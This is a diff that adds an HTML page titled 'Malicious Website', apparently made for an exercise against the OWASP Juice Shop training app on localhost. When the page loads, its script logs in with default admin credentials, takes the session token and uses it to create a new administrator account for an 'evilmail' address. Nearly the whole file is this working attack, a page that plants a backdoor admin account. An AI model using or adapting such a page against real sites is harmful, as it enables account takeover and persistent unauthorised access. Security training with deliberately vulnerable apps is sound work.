@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Malicious Website</title>
+</head>
+<body>
+    <h1>Welcome to Evil Corp!</h1>
+    <p>Creating an admin backdoor...</p>
+    <script>
+        fetch('http://localhost:3000/rest/user/login', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                email: 'admin@juice-sh.op',
+                password: 'admin123'
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Login Successful:', data);
+            const adminToken = data.authentication.token;
+
+
+            fetch('http://localhost:3000/api/Users', {
+                method: 'POST',
+                headers: {
+                    'Authorization': `Bearer ${adminToken}`,
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    email: 'VeryEvilMan@evilmail.com',
+                    password: 'evilpassword123',
+                    role: 'admin'
+                })
+            })
+            .then(createResponse => {
+                if (createResponse.ok) {
+                    console.log('New admin account created successfully!');
+                } else {
+                    console.error('Failed to create new admin account:', createResponse.statusText);
+                }
+            })
+            .catch(error => console.error('Error creating new admin account:', error));
+        })
+        .catch(error => console.error('Login failed:', error));
+    </script>
+</body>
+</html>
